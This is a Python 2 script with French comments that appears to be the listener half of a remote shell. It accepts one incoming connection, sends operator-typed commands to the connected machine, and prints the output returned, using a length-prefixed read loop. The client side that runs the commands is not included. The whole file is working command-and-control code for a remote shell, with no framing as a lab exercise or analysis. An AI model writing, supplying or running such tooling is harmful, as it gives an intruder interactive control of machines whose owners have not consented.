import socket, subprocess as sp,sys

host=sys.argv[1]
port= int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print "Listen en cour sur  %s %d" %(host,port)
conn, addr = s.accept()

print "[+] Connection etablie avec l'hote : %s" %(str(addr[0]))

while 1:

    command=raw_input("#>")
    #si la commande entree sur l eserver est differente de exite()

    if command !="exit()":
        #si la commande est vide on ignore le reste du code et on retourne au debut du while
        if command == "": continue

        #sinon on envoie la commande au client
        conn.send(command)
        #on recupere la reponse du client
        result = conn.recv(1024)
        #on recupere la taille de l'output en bytes
        total_size = long(result[:16]) #les 16 premiers qui en long inquiquent la taille du resultat
        result=result[16:] # Tous sauf les 16 premiers

        #tant qu'on atteint pas la taille totale du resulat
        while total_size > len(result):
            data = conn.recv(1024) #1024 a chaque reception
            result += data
        print result.rstrip("\n") #formatage de la sortie pour eviter les retours a la ligne unitiles

    #si la commande entree est exite()
    else :
        conn.send("exit()")
        print "[+] Connection fermee"
        break
s.close()